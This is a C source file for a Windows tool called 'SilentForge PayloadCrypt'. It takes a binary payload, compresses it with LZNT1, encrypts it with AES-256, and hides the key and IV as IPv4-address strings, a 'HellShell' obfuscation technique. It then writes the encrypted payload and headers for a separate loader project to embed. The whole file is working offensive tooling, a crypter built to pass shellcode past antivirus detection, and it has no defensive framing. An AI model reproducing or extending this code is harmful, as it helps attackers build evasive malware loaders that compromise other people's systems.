#include <windows.h>
#include <stdio.h>
#include "Compress.h"
#include "AesCrypt.h"
#include "HellShellEncode.h"

static BOOL ReadFileToBuffer(const char* szPath, BYTE** ppBuffer, DWORD* pdwSize) {
    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }

    BYTE* pBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (!pBuffer) { CloseHandle(hFile); return FALSE; }

    DWORD dwRead = 0;
    DWORD dwTotalRead = 0;
    while (dwTotalRead < dwSize) {
        DWORD dwChunk = (dwSize - dwTotalRead > 0x10000000) ? 0x10000000 : (dwSize - dwTotalRead);
        if (!ReadFile(hFile, pBuffer + dwTotalRead, dwChunk, &dwRead, NULL)) {
            HeapFree(GetProcessHeap(), 0, pBuffer);
            CloseHandle(hFile);
            return FALSE;
        }
        dwTotalRead += dwRead;
    }
    CloseHandle(hFile);
    *ppBuffer = pBuffer;
    *pdwSize  = dwSize;
    return TRUE;
}

static BOOL WriteBinaryFile(const char* szPath, const BYTE* pData, DWORD dwSize) {
    HANDLE hFile = CreateFileA(szPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwWritten = 0;
    DWORD dwTotalWritten = 0;
    while (dwTotalWritten < dwSize) {
        DWORD dwChunk = (dwSize - dwTotalWritten > 0x10000000) ? 0x10000000 : (dwSize - dwTotalWritten);
        if (!WriteFile(hFile, pData + dwTotalWritten, dwChunk, &dwWritten, NULL)) {
            CloseHandle(hFile);
            return FALSE;
        }
        dwTotalWritten += dwWritten;
    }
    CloseHandle(hFile);
    return TRUE;
}

static void WritePayloadInfoHeader(const char* szPath, DWORD dwEncryptedSize, DWORD dwOriginalSize) {
    FILE* fp = NULL;
    fopen_s(&fp, szPath, "w");
    if (!fp) { printf("[!] Failed to create %s\n", szPath); return; }

    fprintf(fp, "#ifndef PAYLOAD_INFO_H\n");
    fprintf(fp, "#define PAYLOAD_INFO_H\n\n");
    fprintf(fp, "#define PAYLOAD_ENCRYPTED_SIZE  %luUL\n", (unsigned long)dwEncryptedSize);
    fprintf(fp, "#define PAYLOAD_ORIGINAL_SIZE   %luUL\n\n", (unsigned long)dwOriginalSize);
    fprintf(fp, "#endif /* PAYLOAD_INFO_H */\n");
    fclose(fp);
    printf("[+] Wrote %s\n", szPath);
}

int main(int argc, char* argv[]) {
    printf("\n");
    printf("  ============================================\n");
    printf("  =         SilentForge PayloadCrypt         =\n");
    printf("  =     AES-256 + LZNT1 + HellShell IPv4    =\n");
    printf("  ============================================\n\n");

    if (argc < 3) {
        printf("Usage: PayloadCrypt.exe <input.bin> <output_dir>\n");
        printf("  Example: PayloadCrypt.exe thinkpad.bin ..\\Loader\\\n");
        return 1;
    }

    const char* szInputPath = argv[1];
    const char* szOutputDir = argv[2];

    BYTE* pRawPayload = NULL;
    DWORD dwRawSize   = 0;

    printf("[*] Reading payload: %s\n", szInputPath);
    if (!ReadFileToBuffer(szInputPath, &pRawPayload, &dwRawSize)) {
        printf("[!] Failed to read input file\n");
        return 1;
    }
    printf("[+] Read %lu bytes\n", (unsigned long)dwRawSize);

    DWORD dwOriginalSize = dwRawSize;

    BYTE* pCompressed    = NULL;
    DWORD dwCompressedSz = 0;

    printf("[*] Compressing with LZNT1...\n");
    if (!CompressBuffer(pRawPayload, dwRawSize, &pCompressed, &dwCompressedSz)) {
        printf("[!] Compression failed\n");
        HeapFree(GetProcessHeap(), 0, pRawPayload);
        return 1;
    }
    printf("[+] Compressed: %lu -> %lu bytes (%.1f%% reduction)\n",
           (unsigned long)dwRawSize, (unsigned long)dwCompressedSz,
           100.0 * (1.0 - (double)dwCompressedSz / dwRawSize));

    HeapFree(GetProcessHeap(), 0, pRawPayload);

    BYTE aesKey[AES_KEY_SIZE] = { 0 };
    BYTE aesIv[AES_IV_SIZE]   = { 0 };

    printf("[*] Generating AES-256 key and IV...\n");
    if (!GenerateKeyIv(aesKey, aesIv)) {
        printf("[!] Key generation failed\n");
        HeapFree(GetProcessHeap(), 0, pCompressed);
        return 1;
    }

    BYTE* pEncrypted    = NULL;
    DWORD dwEncryptedSz = 0;

    printf("[*] Encrypting with AES-256-CBC...\n");
    if (!AesEncryptPayload(aesKey, aesIv, pCompressed, dwCompressedSz, &pEncrypted, &dwEncryptedSz)) {
        printf("[!] Encryption failed\n");
        HeapFree(GetProcessHeap(), 0, pCompressed);
        return 1;
    }

    HeapFree(GetProcessHeap(), 0, pCompressed);

    char szBinPath[MAX_PATH];
    sprintf_s(szBinPath, MAX_PATH, "%s\\encrypted_payload.bin", szOutputDir);
    if (!WriteBinaryFile(szBinPath, pEncrypted, dwEncryptedSz)) {
        printf("[!] Failed to write encrypted payload\n");
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    printf("[+] Wrote %s (%lu bytes)\n", szBinPath, (unsigned long)dwEncryptedSz);

    char szInfoPath[MAX_PATH];
    sprintf_s(szInfoPath, MAX_PATH, "%s\\PayloadInfo.h", szOutputDir);
    WritePayloadInfoHeader(szInfoPath, dwEncryptedSz, dwOriginalSize);

    HeapFree(GetProcessHeap(), 0, pEncrypted);

    BYTE keyIvBlob[48];
    memcpy(keyIvBlob, aesKey, 32);
    memcpy(keyIvBlob + 32, aesIv, 16);

    char szIpv4Array[HELLSHELL_IPV4_COUNT][16];
    printf("[*] HellShell encoding AES key+IV as IPv4 addresses...\n");
    if (!HellShellEncodeToIpv4(keyIvBlob, 48, szIpv4Array)) {
        printf("[!] HellShell encoding failed\n");
        return 1;
    }

    for (int i = 0; i < HELLSHELL_IPV4_COUNT; i++)
        printf("    [%02d] %s\n", i, szIpv4Array[i]);

    char szKeyPath[MAX_PATH];
    sprintf_s(szKeyPath, MAX_PATH, "%s\\PayloadKey.h", szOutputDir);

    FILE* fpKey = NULL;
    fopen_s(&fpKey, szKeyPath, "w");
    if (!fpKey) {
        printf("[!] Failed to create %s\n", szKeyPath);
        return 1;
    }
    HellShellWriteHeader(fpKey, szIpv4Array);
    fclose(fpKey);
    printf("[+] Wrote %s\n", szKeyPath);

    SecureZeroMemory(aesKey, sizeof(aesKey));
    SecureZeroMemory(aesIv, sizeof(aesIv));
    SecureZeroMemory(keyIvBlob, sizeof(keyIvBlob));

    printf("\n[+] PayloadCrypt complete. Output files:\n");
    printf("    - %s  (encrypted payload binary)\n", szBinPath);
    printf("    - %s  (payload size metadata)\n", szInfoPath);
    printf("    - %s  (IPv4-encoded AES key+IV)\n", szKeyPath);
    printf("\n[*] Rebuild the Loader project to embed the new payload.\n");

    return 0;
}
